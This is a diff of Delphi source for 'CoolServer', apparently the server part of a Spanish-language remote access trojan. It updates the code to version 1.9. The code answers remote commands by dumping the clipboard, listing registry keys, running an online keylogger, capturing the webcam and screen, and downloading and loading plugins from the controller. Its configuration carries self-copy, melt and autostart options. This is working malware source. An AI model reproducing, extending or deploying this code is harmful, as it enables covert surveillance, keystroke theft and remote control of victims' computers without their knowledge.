@@ -14,7 +14,6 @@
 *)
 //library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
 program CoolServer; //Para debug, más lineas "Para debug" abajo
-
 uses
   Windows,
   SysUtils,
@@ -63,7 +62,6 @@ var
 
 const
   WM_ACTIVATE = $0006;
-  ENTER = #10;
 
 procedure sendText(str: AnsiString);
 begin
@@ -272,6 +270,7 @@ begin
                 begin
                   //SendText('MSG|Adiós!');
                   //Halt;
+                  DesactivarWebcams();
                   ExitProcess(0);
                 end;
 
@@ -287,7 +286,10 @@ begin
                   Borrararchivo(extractfilepath(ParamStr(0)) + Configuracion.sPluginName);
                   if ShellExecute(0, 'open', PChar(ParamStr(0)), '' {sin parametros},
                     PChar(ExtractFilePath(ParamStr(0))), SW_NORMAL) > 32 then
-                    ExitProcess(0)
+                    begin
+                      DesactivarWebcams();
+                      ExitProcess(0);
+                    end
                   else
                     SendText('MSG|{1}' + ENTER);
                 end;
@@ -721,8 +723,6 @@ begin
               Delete(Recibido, 1, 13);
               Tempstr := '';
               TempStr := ListarClaves(Recibido);
-              TempStr := StringReplace(Trim(TempStr), #10, '|salto|', [rfReplaceAll]);
-              TempStr := StringReplace((TempStr), #13, '|salto2|', [rfReplaceAll]);
               SendText('LISTARCLAVES|' {+ IntToStr(length(TempStr)) + '|'} + TempStr + ENTER);
             end;
 
@@ -731,8 +731,6 @@ begin
               Delete(Recibido, 1, 14);
               Tempstr := '';
               Tempstr := ListarValores(Recibido);
-              TempStr := StringReplace(Trim(TempStr), #10, '|salto|', [rfReplaceAll]);
-              TempStr := StringReplace((TempStr), #13, '|salto2|', [rfReplaceAll]);
 
               SendText('LISTARVALORES|' + TempStr + ENTER);
             end;
@@ -1130,9 +1128,6 @@ begin
               Delete(Recibido, 1, 7);
               Tempstr := '';
               Tempstr := GetClipBoardDatas;
-              //Tenemos que eliminar los #10 y #13 para que todo  se mande en una sola línea
-              TempStr := StringReplace(Trim(TempStr), #10, '|salto|', [rfReplaceAll]);
-              TempStr := StringReplace((TempStr), #13, '|salto2|', [rfReplaceAll]);
               SendText('GETCLIP|' + TempStr + ENTER);
             end;
 
@@ -1142,8 +1137,6 @@ begin
               //Cambiamos los |saltos| por saltos de línea
               TempStr := '';
               TempStr := Recibido;
-              TempStr := StringReplace(Trim(TempStr), '|salto|', #10, [rfReplaceAll]);
-              TempStr := StringReplace((TempStr), '|salto2|', #13, [rfReplaceAll]);
               SetClipBoardDatas(PChar(TempStr));
               SendText('MSG|{54}' + ENTER);
             end;
@@ -1187,25 +1180,25 @@ begin
                 bool := true;
               end;
 
-            if fileexists(extractfilepath(paramstr(0))+TempStr) then
+            if fileexists(extractfilepath(Configuracion.sCopyTo)+TempStr) and (bool = false) then   //Lo cargamos desde el archivo
             begin
               Plugins[PluginCount].Nombre := TempStr;
               Plugins[PluginCount].id := i;
 
-              CargarPlugin(PluginCount, sock);
-              Plugincount := Plugincount+1;
-              SendText('PLUGINLOADED|'+inttostr(i)+'|'+ENTER);  //Plugin cargado
+              if CargarPlugin(PluginCount, sock) then
+              begin
+                Plugincount := Plugincount+1;
+                SendText('PLUGINLOADED|'+inttostr(i)+'|'+ENTER);  //Plugin cargado
+              end;
             end
             else  
             if bool = false then
             begin
-              SendText('PLUGINUPLOAD|'+inttostr(i)+'|'+ENTER);  //mandamos que nos lo envie
+              SendText('PLUGINUPLOAD|'+inttostr(i)+'|'+ENTER);  //le avisamos para que nos lo envie
             end;
           end;
 
-
-
-          if Pos('PLUGINUPLOAD', Recibido) = 1 then //Cargar un plugin
+          if Pos('PLUGINUPLOAD', Recibido) = 1 then //Nos envia un plugin
           begin
             Delete(Recibido, 1, 13);
             TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Nombre
@@ -1214,18 +1207,18 @@ begin
             Delete(Recibido, 1, Pos('|', Recibido));
             i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0); //ID
             Delete(Recibido, 1, Pos('|', Recibido));
-
-            getFile(Sock, extractfilepath(paramstr(0))+TempStr, o, false);
+                                                                 
+            getFile(Sock, extractfilepath(Configuracion.sCopyTo)+TempStr+'.cp', o, false);  //Lo recibimos a un archivo con el nombre del plugin+'.cp'
 
             Plugins[PluginCount].Nombre := TempStr;
             Plugins[PluginCount].id := i;
 
 
-            CargarPlugin(PluginCount, sock);
-            
-            SendText('PLUGINLOADED|'+inttostr(i)+'|'+ENTER);  //Plugin cargado
-            
-            Plugincount := Plugincount+1;
+            if CargarPlugin(PluginCount, sock) then
+            begin
+              SendText('PLUGINLOADED|'+inttostr(i)+'|'+ENTER);  //Plugin cargado
+              Plugincount := Plugincount+1;
+            end;
           end;
 
           if Pos('PLUGINDATA', Recibido) = 1 then //Cargar un plugin
@@ -1235,7 +1228,10 @@ begin
             Delete(Recibido, 1, Pos('|', Recibido));
             for i:=0 to Plugincount do
               if Plugins[i].nombre = TempStr then
+              begin
                 Plugins[i].Recdata(Recibido);
+              end;
+
           end;
           
           lastCommandTime := GetTickCount;
@@ -1244,6 +1240,7 @@ begin
 
       //Estamos desconectados así que tenemos que desactivar la webcam y el online keylogger
       //La shell se desactiva automaticamente
+
       SetOnlineKeylogger(False, nil); //Desactivamos online keylogger
       CapturaWebcam := '';
       CapturaPantalla := '';
@@ -1269,10 +1266,12 @@ end; //Fin del OnRead del socket
 procedure CargarServidor(P: Pointer);
 begin
   Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
-  VersionDelServer := '1.8';
+  if not Configuracion.bCopiarArchivo then
+    Configuracion.sCopyTo := extractfilepath(paramstr(0));
+  VersionDelServer := '1.9';
   BeginThread(nil, 0, Addr(KeepAliveThread), nil, 0, id1);
   OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
-
+  CargarPluginsDeInicio();
   while True do
     begin
       iniciar();
@@ -1288,7 +1287,7 @@ begin
   Configuracion.sID                     := 'Coolserver';
   Configuracion.bCopiarArchivo          := False; //Me copio o no?
   Configuracion.sFileNameToCopy         := 'coolserver.exe';
-  Configuracion.sCopyTo                 := 'C:\';
+  Configuracion.sCopyTo                 := extractfilepath(paramstr(0));
   Configuracion.bCopiarConFechaAnterior := False;
   Configuracion.bMelt                   := False;
   Configuracion.bArranqueRun            := False;
